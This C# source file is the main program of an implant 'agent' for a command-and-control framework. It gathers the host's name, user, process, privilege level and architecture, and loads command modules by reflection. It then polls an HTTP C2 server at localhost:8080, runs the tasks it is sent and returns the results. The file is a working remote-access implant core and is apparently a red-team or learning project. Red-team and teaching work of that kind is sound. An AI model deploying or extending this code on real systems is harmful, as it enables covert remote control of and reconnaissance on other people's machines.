using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    internal static class Program
    {
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        // List populated with all the commands from the commands folder
        private static List<AgentCommand> _commands = new List<AgentCommand>();
        static void Main(string[] args)
        {
            Thread.Sleep(5000);
            GenerateMetadata();
            LoadAgentCommands();

            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    HandleTasks(tasks);
                }
            }
        }

        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
            if (command is null)
            {
                SendTaskResult(task.Id, "Command not found.");
                return;
            }

            try 
            {
                var result = command.Execute(task);
                SendTaskResult(task.Id, result);
            }
            catch (Exception e)
            {
                SendTaskResult(task.Id, e.Message);
            }
            
        }

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }

        // Stop method shuts down the agent
        public static void Stop()
        {
            _tokenSource.Cancel();
        }
        /// <summary>
        /// Scans the executing assembly for classes that inherit from AgentCommand, creates instances
        /// and adds these instances to the _commands list for later execution.
        /// </summary>
        private static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach(var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand)Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }
        /// <summary>
        /// Generates metadata for the agents in the c2 framework, including details
        /// such as process ID, process name, user identity, system integrity level, 
        /// and system architecture (x86 or x64). The generated metadata is stored in
        /// the _metadata field, which is an instance of the AgentMetadata class.
        /// </summary>
        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }
                

            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName, // Getting the hostname from a DNS Lookup would be more reliable, but let´s keep it like that for now.
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
